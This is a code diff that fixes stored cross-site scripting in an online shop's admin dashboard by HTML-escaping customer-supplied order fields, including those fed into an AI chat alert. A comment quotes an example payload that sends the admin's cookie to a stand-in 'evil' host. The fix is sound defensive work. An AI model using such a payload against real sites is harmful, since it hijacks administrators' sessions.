@@ -1916,6 +1916,19 @@ function renderRecentOrders() {
     </tr>`).join('');
 }
 
+// SECURITY: every value here can be typed by a customer at checkout with no
+// server-side validation of its content — dashboard views render it via
+// innerHTML (needed for the markup/formatting), so anything customer-controlled
+// MUST be escaped first, or a malicious order (e.g. a name like
+// `<img src=x onerror=fetch('https://evil/steal?c='+document.cookie)>`) would
+// run arbitrary script in the admin's own logged-in browser session the
+// moment they open the Orders tab or view that order.
+function _escHtml(s) {
+  return String(s ?? '').replace(/[&<>"']/g, c => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
+  }[c]));
+}
+
 function renderOrders() {
   const tbody = document.getElementById('orders-tbody');
   const empty = document.getElementById('orders-empty');
@@ -1923,15 +1936,15 @@ function renderOrders() {
   empty.style.display = 'none';
   tbody.innerHTML = [...ORDERS].reverse().map(o => `
     <tr>
-      <td style="font-size:11px;color:var(--muted)">#${o.id?.slice(-8)||'—'}</td>
-      <td><strong>${o.firstName||''} ${o.lastName||''}</strong><br><span style="font-size:11px;color:var(--muted)">${o.email||''}</span></td>
-      <td>${o.phone||'—'}</td>
+      <td style="font-size:11px;color:var(--muted)">#${_escHtml(o.id?.slice(-8))||'—'}</td>
+      <td><strong>${_escHtml(o.firstName)||''} ${_escHtml(o.lastName)||''}</strong><br><span style="font-size:11px;color:var(--muted)">${_escHtml(o.email)||''}</span></td>
+      <td>${_escHtml(o.phone)||'—'}</td>
       <td>${(o.items||[]).length} items</td>
       <td><strong>$${o.total||'0.00'}</strong></td>
-      <td>${o.payment||'—'}</td>
+      <td>${_escHtml(o.payment)||'—'}</td>
       <td style="font-size:12px">${new Date(o.time).toLocaleDateString()}</td>
-      <td><span class="order-status status-${o.status||'new'}">${o.status||'new'}</span></td>
-      <td><button class="btn btn-outline btn-sm" onclick="viewOrder('${o.id}')">View</button></td>
+      <td><span class="order-status status-${_escHtml(o.status)||'new'}">${_escHtml(o.status)||'new'}</span></td>
+      <td><button class="btn btn-outline btn-sm" onclick="viewOrder('${_escHtml(o.id)}')">View</button></td>
     </tr>`).join('');
 }
 
@@ -1940,7 +1953,7 @@ window.viewOrder = function(id) {
   if (!o) return;
   activeOrderId = id;
   document.getElementById('order-modal-title').textContent = `Order #${id.slice(-8)}`;
-  const discountRow = o.discount > 0 ? `<div style="display:flex;justify-content:space-between;padding:8px 14px;font-size:13px;color:#16a34a"><span>Discount (${o.promoCode||''})</span><strong>-$${parseFloat(o.discount||0).toFixed(2)}</strong></div>` : '';
+  const discountRow = o.discount > 0 ? `<div style="display:flex;justify-content:space-between;padding:8px 14px;font-size:13px;color:#16a34a"><span>Discount (${_escHtml(o.promoCode)||''})</span><strong>-$${parseFloat(o.discount||0).toFixed(2)}</strong></div>` : '';
 
   const rxPendingBanner = o.rxPricesPending ? `
     <div style="background:#fef3c7;border:1px solid #fcd34d;border-radius:10px;padding:10px 14px;margin-bottom:12px;font-size:13px;color:#92400e;display:flex;align-items:center;gap:8px">
@@ -1958,28 +1971,28 @@ window.viewOrder = function(id) {
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
       <div>
         <strong style="font-size:11px;color:var(--muted);letter-spacing:.5px">CUSTOMER (ORDERING FROM)</strong>
-        <p style="margin-top:4px;font-weight:600">${o.firstName||''} ${o.lastName||''}</p>
-        <p style="font-size:12px;color:var(--muted)">${o.email||'—'}</p>
-        <p style="font-size:12px;color:var(--muted)">${o.phone||o.buyerPhone||'—'}</p>
-        <p style="font-size:12px;color:var(--muted)">🌍 ${o.buyerCountry||o.country||'—'}</p>
+        <p style="margin-top:4px;font-weight:600">${_escHtml(o.firstName)||''} ${_escHtml(o.lastName)||''}</p>
+        <p style="font-size:12px;color:var(--muted)">${_escHtml(o.email)||'—'}</p>
+        <p style="font-size:12px;color:var(--muted)">${_escHtml(o.phone||o.buyerPhone)||'—'}</p>
+        <p style="font-size:12px;color:var(--muted)">🌍 ${_escHtml(o.buyerCountry||o.country)||'—'}</p>
       </div>
       <div>
         <strong style="font-size:11px;color:var(--muted);letter-spacing:.5px">COLLECTOR IN LIBERIA</strong>
-        <p style="margin-top:4px;font-weight:600">${o.pickupName||o.firstName||'—'}</p>
-        <p style="font-size:12px;color:var(--muted)">📞 ${o.pickupPhone||o.phone||'—'}</p>
+        <p style="margin-top:4px;font-weight:600">${_escHtml(o.pickupName||o.firstName)||'—'}</p>
+        <p style="font-size:12px;color:var(--muted)">📞 ${_escHtml(o.pickupPhone||o.phone)||'—'}</p>
       </div>
       <div>
         <strong style="font-size:11px;color:var(--muted);letter-spacing:.5px">PAYMENT METHOD</strong>
-        <p style="margin-top:4px;font-weight:600">${o.paymentMethod||o.payment||'—'}</p>
-        <p style="font-size:12px;color:var(--muted)">${o.paymentStatus||'—'}</p>
+        <p style="margin-top:4px;font-weight:600">${_escHtml(o.paymentMethod||o.payment)||'—'}</p>
+        <p style="font-size:12px;color:var(--muted)">${_escHtml(o.paymentStatus)||'—'}</p>
       </div>
       <div>
         <strong style="font-size:11px;color:var(--muted);letter-spacing:.5px">STATUS</strong>
-        <p style="margin-top:6px"><span class="order-status status-${o.status||'new'}">${o.status||'new'}</span></p>
+        <p style="margin-top:6px"><span class="order-status status-${_escHtml(o.status)||'new'}">${_escHtml(o.status)||'new'}</span></p>
         ${o.confirmedByCustomer ? '<p style="font-size:11px;color:#16a34a;margin-top:4px">✅ Confirmed by customer</p>' : ''}
       </div>
     </div>
-    ${o.notes ? `<div style="background:#f8fafc;border:1px solid var(--border);border-radius:8px;padding:10px 14px;margin-bottom:12px;font-size:13px"><strong>📝 Notes:</strong> ${o.notes}</div>` : ''}
+    ${o.notes ? `<div style="background:#f8fafc;border:1px solid var(--border);border-radius:8px;padding:10px 14px;margin-bottom:12px;font-size:13px"><strong>📝 Notes:</strong> ${_escHtml(o.notes)}</div>` : ''}
     <strong style="font-size:11px;color:var(--muted);letter-spacing:.5px">ORDER ITEMS</strong>
     <div style="margin-top:8px;border:1px solid var(--border);border-radius:10px;overflow:hidden">
       ${(o.items||[]).map(item => {
@@ -1988,7 +2001,7 @@ window.viewOrder = function(id) {
           ? '<span style="color:#0891b2;font-size:12px;font-weight:600">Contact for pricing</span>'
           : '$' + ((item.price||0)*(item.qty||1)).toFixed(2);
         return `<div style="display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-bottom:1px solid var(--border);font-size:13px">
-          <span>${item.name||item.id||'Item'} × ${item.qty||1}${isRx ? ' <span style="background:#eff6ff;color:#1d4ed8;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:600">RX</span>' : ''}</span>
+          <span>${_escHtml(item.name||item.id)||'Item'} × ${item.qty||1}${isRx ? ' <span style="background:#eff6ff;color:#1d4ed8;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:600">RX</span>' : ''}</span>
           <strong>${priceDisplay}</strong>
         </div>`;
       }).join('')}
@@ -3476,11 +3489,19 @@ Status breakdown: New=${statusCounts.new||0}, Processing=${statusCounts.processi
 // ── AI NEW ORDER ALERT ────────────────────────────────────────────────────────
 // Called automatically when a new order arrives from Firestore — injects full
 // order details into the AI chat so the admin sees it instantly without asking
+//
+// SECURITY: addAIMessage() renders its text via innerHTML (to support **bold**
+// and line breaks), so any customer-controlled field embedded here MUST be
+// HTML-escaped first — otherwise a customer could put an XSS payload in their
+// name/phone/note at checkout and have it execute in the admin's own browser
+// the moment this alert renders.
 function _aiNewOrderAlert(o, docId) {
   const orderId = docId.slice(-8).toUpperCase();
+  const esc = _escHtml;
   const itemLines = (o.items || []).map(i => {
-    if (i.category === 'rx') return `  • ${i.name} ×${i.qty} — RX (call customer for price)`;
-    return `  • ${i.name} ×${i.qty} — $${((i.price || 0) * i.qty).toFixed(2)}`;
+    const name = esc(i.name);
+    if (i.category === 'rx') return `  • ${name} ×${i.qty} — RX (call customer for price)`;
+    return `  • ${name} ×${i.qty} — $${((i.price || 0) * i.qty).toFixed(2)}`;
   }).join('\n') || '  (no items)';
 
   const rxWarning = o.rxPricesPending
@@ -3490,17 +3511,17 @@ function _aiNewOrderAlert(o, docId) {
   const alert = [
     `🛒 NEW ORDER — #${orderId}`,
     ``,
-    `👤 Customer: ${o.firstName} ${o.lastName}`,
-    `📞 Phone: ${o.phone || '—'}`,
-    `🌍 Country: ${o.country || '—'}`,
-    `🏪 Collector in Liberia: ${o.pickupName || '—'} — ${o.pickupPhone || '—'}`,
+    `👤 Customer: ${esc(o.firstName)} ${esc(o.lastName)}`,
+    `📞 Phone: ${esc(o.phone) || '—'}`,
+    `🌍 Country: ${esc(o.country) || '—'}`,
+    `🏪 Collector in Liberia: ${esc(o.pickupName) || '—'} — ${esc(o.pickupPhone) || '—'}`,
     ``,
     `📦 Items:`,
     itemLines,
     ``,
     `💵 Total: $${o.total}${o.rxPricesPending ? ' + RX price TBC' : ''}`,
-    `💳 Payment: ${o.paymentMethod || '—'} — ${o.paymentStatus || 'Pending'}`,
-    o.notes ? `📝 Customer note: ${o.notes}` : '',
+    `💳 Payment: ${esc(o.paymentMethod) || '—'} — ${esc(o.paymentStatus) || 'Pending'}`,
+    o.notes ? `📝 Customer note: ${esc(o.notes)}` : '',
     rxWarning,
     ``,
     `I've recorded this order in the system. You can ask me to update its status, confirm payment, add a note, or anything else you need.`,
